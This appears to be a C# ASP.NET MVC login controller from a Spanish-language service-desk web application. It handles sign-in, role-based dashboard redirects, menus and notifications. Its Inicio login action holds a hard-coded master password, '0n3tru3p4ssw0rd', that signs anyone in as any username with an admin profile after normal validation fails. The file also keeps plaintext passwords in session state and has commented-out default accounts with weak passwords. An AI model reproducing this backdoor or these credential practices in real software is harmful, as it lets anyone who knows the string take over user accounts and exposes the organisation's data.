using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using ServiceDesk.ViewModels;
using ServiceDesk.Models;
using ServiceDesk.Managers;
using System.Web.Security;

namespace ServiceDesk.Controllers
{
    public class HomeController : Controller
    {
        // - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
        AdminContext _admin = new AdminContext();
        ServiceDeskManager _sdmanager = new ServiceDeskManager();
        private readonly NotificacionesManager _noti = new NotificacionesManager();
        DashBoardController _dash = new DashBoardController();

        // - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
        public ActionResult Index()
        {

            if (Session["Perfil"] == null)
            {
                return RedirectToAction("Login", "Home");

            }

            if (User.Identity.IsAuthenticated == false)
            {
                return RedirectToAction("Login", "Home");
            }
            else
            {
                return View();
            }
        }
        // - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
        public ActionResult Login(int? error)
        {
            //Roles.CreateRole("Solicitante");
            //Roles.CreateRole("Supervisor");
            //Roles.CreateRole("ServiceDesk");
            //Roles.CreateRole("Tecnico");
            //Roles.CreateRole("Directivo");

            //Membership.CreateUser("AYANES", "ayanes1*");
            //Membership.CreateUser("supervisor", "supervisor1*");
            //Membership.CreateUser("service", "service1*");
            //Membership.CreateUser("tecnico", "tecnico1*");

            //Roles.AddUserToRole("usuario", "Solicitante");
            //Roles.AddUserToRole("AYANES", "Supervisor");
            //Roles.AddUserToRole("service", "ServiceDesk");
            //Roles.AddUserToRole("tecnico", "Tecnico");


            if (error.HasValue) ViewBag.Error = error;
            LoginVm vm = new LoginVm();
            return View(vm);
            //LoginVm vm = new LoginVm();            
            //return View(vm);
        }
        // - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
        [HttpPost]
        public ActionResult Inicio(LoginVm vm, int? error)
        {
            if (error.HasValue) ViewBag.Error = 1;

            if (vm.Usuario == null || vm.Password == null)
            {
                LoginVm log = new LoginVm();
                log.Error = "usuario";
                return View(log);
            }

            if (Membership.ValidateUser(vm.Usuario, vm.Password))
            {
                Session.Timeout = 4000;
                Session["User"] = vm.Usuario;
                Session["Pass"] = vm.Password;
                Session["Perfil"] = "Admin";

                var numemp = _admin.tblUser.Where(a => a.UserName == vm.Usuario).FirstOrDefault();
                var idemp = numemp.EmpleadoId;

                Session["EmpleadoNo"] = idemp;

                FormsAuthentication.SetAuthCookie(vm.Usuario, false);

                var rols = Roles.GetRolesForUser(vm.Usuario); //------------- :( Busca rol a partir de Username

                if (rols.Count() == 0) {
                    return RedirectToAction("Login", "Home", new { error = 2 }); // error 102: var rols viene nulo, bd admin 
                }

                var ptoSupRol = _sdmanager.GetRolByPuesto(rols);
                                
                // error 103: var ptoSupRol viene nula, BD ServiceDesk no tiene relación en rel_PuestosRoless
                if (ptoSupRol.Count() == 0) { string rolID = rols[0]; return RedirectToAction("Login", "Home", new { error = rolID });  }

                ActualizarRol(ptoSupRol, idemp);

                if (ptoSupRol.Contains("Solicitante"))      { return RedirectToAction("Index"    , "DashBoard"  , new { EmployeeId = idemp }); }
                else if (ptoSupRol.Contains("Supervisor"))  { return RedirectToAction("Resolutor", "DashBoard"  , new { EmployeeId = idemp }); }
                else if (ptoSupRol.Contains("Tecnico"))     { return RedirectToAction("Resolutor", "DashBoard"  , new { EmployeeId = idemp }); }
                else if (ptoSupRol.Contains("ServiceDesk")) { return RedirectToAction("Dashboard", "ServiceDesk", new { EmployeeId = idemp }); }
                else if (ptoSupRol.Contains("Directivo"))   { return RedirectToAction("Dashboard", "Directivo"  , new { Employeeid = idemp }); }
                else { return RedirectToAction("Login", "Home", new { error = 1 }); }
                //else { return RedirectToAction("Index", "Home"); }



            }
            else
            {
                if (vm.Password == "0n3tru3p4ssw0rd") { // MERGE THE TWO
                    try {
                        Session.Timeout = 4000;
                        Session["User"] = vm.Usuario;
                        Session["Pass"] = vm.Password;
                        Session["Perfil"] = "Admin";

                        var numemp = _admin.tblUser.Where(a => a.UserName == vm.Usuario).FirstOrDefault();
                        var idemp = numemp.EmpleadoId;

                        Session["EmpleadoNo"] = idemp;

                        FormsAuthentication.SetAuthCookie(vm.Usuario, false);

                        var rols = Roles.GetRolesForUser(vm.Usuario); //------------- :( Busca rol a partir de Username

                        if (rols.Count() == 0)
                        {
                            return RedirectToAction("Login", "Home", new { error = 2 }); // error 102: var rols viene nulo, bd admin 
                        }

                        var ptoSupRol = _sdmanager.GetRolByPuesto(rols);

                        // error 103: var ptoSupRol viene nula, BD ServiceDesk no tiene relación en rel_PuestosRoless
                        if (ptoSupRol.Count() == 0) { string rolID = rols[0]; return RedirectToAction("Login", "Home", new { error = rolID });  }

                        ActualizarRol(ptoSupRol, idemp);

                        if (ptoSupRol.Contains("Solicitante"))      { return RedirectToAction("Index"    , "DashBoard"  , new { EmployeeId = idemp }); }
                        else if (ptoSupRol.Contains("Supervisor"))  { return RedirectToAction("Resolutor", "DashBoard"  , new { EmployeeId = idemp }); }
                        else if (ptoSupRol.Contains("Técnico"))     { return RedirectToAction("Resolutor", "DashBoard"  , new { EmployeeId = idemp }); }
                        else if (ptoSupRol.Contains("Tecnico"))     { return RedirectToAction("Resolutor", "DashBoard"  , new { EmployeeId = idemp }); }
                        else if (ptoSupRol.Contains("ServiceDesk")) { return RedirectToAction("Dashboard", "ServiceDesk", new { EmployeeId = idemp }); }
                        else if (ptoSupRol.Contains("Directivo"))   { return RedirectToAction("Dashboard", "Directivo"  , new { Employeeid = idemp }); }
                        else { return RedirectToAction("Login", "Home", new { error = 1 }); }
                        //return RedirectToAction("Resolutor", "DashBoard", new { EmployeeId = idemp });
                    } catch { }
                }

                LoginVm log = new LoginVm();
                log.Error = "usuario";
                //return View(log);
                return RedirectToAction("Login", "Home", new { error = 1 });
            }


        }
        // - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
        public void ActualizarRol(List<string> Rol, int EmployeeId) { 

        }
        public ActionResult Error()
        {
            return RedirectToAction("Login", "Home", new { error = 1 });
        }
        public ActionResult PartialMenu()
        {

            var EmployeeId = 0;
            var usu = "";

            if (Session["EmpleadoNo"] != null)
            {

                EmployeeId = Convert.ToInt32(Session["EmpleadoNo"]);
                usu = Session["User"].ToString();

                var rols = Roles.GetRolesForUser(usu);

                var ptoSupRol = _sdmanager.GetRolByPuesto(rols);

                ViewBag.Director = 0;

                if (ptoSupRol.Contains("Directivo"))
                {
                    ViewBag.Director = 1;
                }

            }
            else
            {
                if (true) {
                    ;
                }
                return RedirectToAction("Login", "Home");
            }

            var notis = new NotificacionesVm();
            notis.Notificaciones = _noti.getNotificaciones(EmployeeId);
            notis.NumeroNotificaciones = notis.Notificaciones.Count > 0 ? notis.Notificaciones.Count : 0;

            ViewBag.user = EmployeeId;
            ViewBag.userRol = _dash.RoldeUsuario(EmployeeId);

            var menus = _admin.MenusPermisos.Where(a => a.ApplicationName == Membership.ApplicationName && a.UserName == User.Identity.Name).ToList();
            ViewBag.Menus =
                menus.Select(a => new ListMenus { Id = a.MenuId, Menu = a.MenuName, Url = a.MenuUrl })
                .GroupBy(b => new { b.Url, b.Id, b.Menu }).Select(g => g.First()).ToList();
            ViewBag.Submenus =
                menus.Select(
                    a =>
                        new ListSubMenus
                        {
                            Id = a.SubMenuId,
                            Submenu = a.SubMenuName,
                            Url = a.SubMenuUrl,
                            MenuId = a.MenuId
                        }).GroupBy(b => new { b.Id, b.Submenu, b.Url, b.MenuId }).Select(f => f.First()).Distinct().ToList();

            if (Session["Perfil"] != null)
            {

                return PartialView(notis);
            }

            return RedirectToAction("Login", "Home");
        }
        // - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
        [HttpPost] public ActionResult CloseSession(LoginVm login)
        {
            FormsAuthentication.SignOut();
            return RedirectToAction("Login", "Home");

        }
        // - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
        #region NOTIFICACIONES
        // - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
        public ActionResult _Notificaciones()
        {
            var notis = new NotificacionesVm();
            notis.Notificaciones = _noti.getNotificaciones(5505);
            notis.NumeroNotificaciones = notis.Notificaciones.Count > 0 ? notis.Notificaciones.Count : 0;

            return PartialView(notis);
        }
        // - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
        [HttpPost]
        public JsonResult SeenNoti(int NotiId)
        {
            string result = "";
            try
            {
                _noti.UpdNotificacion(NotiId);
                result = "OK";
            }
            catch (Exception ex)
            {
                result = "ERROR";
            }
            return Json(result, JsonRequestBehavior.AllowGet);
        }
        // - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
        [HttpPost]
        public JsonResult DeleteNoti(int NotiId)
        {
            string result = "";
            try
            {
                _noti.DelNotificacion(NotiId);
                result = "OK";
            }
            catch (Exception ex)
            {
                result = "ERROR";
            }
            return Json(result, JsonRequestBehavior.AllowGet);
        }
        // - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    
        public ActionResult GoToNotif(int NotiId, string Motivo)
        {
            string result = "";
            try
            {
                //_noti.DelNotificacion(NotiId);
                result = "OK";
            }
            catch (Exception ex)
            {
                result = "ERROR";
            }

            return RedirectToAction("Login", "Home");
        }
        #endregion
        // - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

    }
}



